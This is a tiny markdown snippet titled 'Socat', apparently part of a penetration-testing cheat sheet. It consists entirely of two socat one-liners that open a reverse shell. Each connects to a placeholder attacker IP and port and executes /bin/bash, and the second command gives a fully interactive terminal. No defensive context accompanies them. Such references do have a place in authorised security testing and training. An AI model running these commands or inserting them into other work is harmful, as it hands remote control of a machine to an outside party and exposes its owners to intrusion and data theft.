# Socat

```
$ socat TCP4:<attacker_IP>:<attacker_PORT> EXEC:/bin/bash

$ socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker_IP>:<attacker_PORT>
```